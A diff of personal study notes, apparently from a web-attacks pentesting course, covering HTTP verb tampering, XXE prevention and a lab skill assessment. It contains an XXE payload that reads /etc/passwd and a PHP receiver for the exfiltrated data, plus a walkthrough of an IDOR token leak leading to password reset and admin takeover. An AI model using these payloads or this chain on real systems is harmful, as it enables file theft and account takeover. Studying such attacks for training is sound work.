@@ -2,6 +2,7 @@
 
 #### Lessons:
 - It matters if scripts are run with sh or bash! You wan to use bash when you can, so add the `#!/usr/bin/env bash` shabang at the top of the script. 
+- Lookup blind XXE, this is a bit wierd. 
 
 #### HTTP verb tampering 
 - Exploits web servers that accept many http verbs and methods.
@@ -100,8 +101,6 @@ Request we send to the target:
 <root>&content;</root>
 ```
 
-
-
 Payload: xxe.dtd
 ```
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
@@ -116,4 +115,36 @@ if(isset($_GET['content'])){
 }
 ?>
 ```
--
+
+
+**XXE prevention:**
+- XML input usually not handled manually by the web app, but rather by built-in XML libs. If these libs are up to date, it will mitigate the change of XXE
+- https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php 
+- Disable runtime error displaying in the web server
+
+Configuring XML correctly will also help: 
+- Disable referencing custom `Document Type Definitions (DTDs)`
+- Disable referencing `External XML Entities`
+- Disable `Parameter Entity` processing
+- Disable support for `XInclude`
+- Prevent `Entity Reference Loops`
+
+
+Skill assessment:
+- PHPSESSID does not look like a hash, is there a way to forge them? That might let us exploit idor or change passwords for different users.
+
+```
+GET /api.php/token/73 HTTP/1.1
+Host: 154.57.164.79:30959
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://154.57.164.79:30959/settings.php
+Connection: keep-alive
+Priority: u=4
+```
+- The above gives us tokens for any users, notice we have removed the cookie header. 
+- Once we get a token without a phpsession cookie, can be used to reset password? -> must be done with GET request, normal /reset.php is by default POST but it also accepts GET.
+- We need to know the usernames of the uid we just changed -> /api.php/user/id -> only 100 users from 1 - 100. One of the users worked for the company "administrator", we log into this one. 
+Here we have a way to post xml data, there should be a way to do xxe. 
